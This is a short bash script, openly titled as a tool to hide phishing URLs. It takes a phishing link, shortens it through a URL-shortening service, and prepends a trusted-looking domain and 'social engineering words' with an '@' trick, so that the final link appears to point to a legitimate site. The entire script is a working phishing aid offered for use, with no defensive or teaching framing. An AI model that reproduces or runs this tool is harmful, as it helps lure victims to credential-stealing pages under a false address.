# Bash Script for Hide Phishing URL Created by KP

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}

echo
echo
echo -e "\e[1;31;42m ____ \e[0m"
echo -e "\e[1;31;42m|  _ \ \e[0m"
echo -e "\e[1;31;42m| |_) | ___  ___ \e[0m"
echo -e "\e[1;31;42m|  _ < / _ \/ _ \ \e[0m"
echo -e "\e[1;31;42m| |_) |  __/  __/ \e[0m"
echo -e "\e[1;31;42m|____/ \___|\___| v.0.1 \e[0m"
echo
echo -e "\e[32m============================================\e[m "
echo -e "\e[31m    [\e[32m★\e[31m]\e[93m Instagram : bhikan_deshmukh \e[31m [\e[32m★\e[31m]\e[m "
echo -e "\e[32m============================================\e[m " 
echo
echo
echo -e "\e[1;31;42m Phishing URL \e[0m"
echo
echo -n "Paste Phishing URL here (with http or https): "
read phish
url_checker $phish
short=$(curl -s https://da.gd/s/?url=${phish})
shorter=${short#https://}
echo
echo -e "\e[1;31;42m  Masking Domain \e[0m"
echo 'Domain to mask the Phishing URL (with http or https), ex https://google.com, http
://anything.org) :'
echo
read mask
url_checker $mask
echo
echo 'Type social engineering words:(eg. free-money, free-followers)'
echo
echo -e "\e[31mDon't use space just use '-' between social engineering words\e[0m"
echo
read words
echo
echo 'Generating Link...'
echo
echo 'Here is the Link..'
echo
final=$mask-$words@$shorter
echo $final
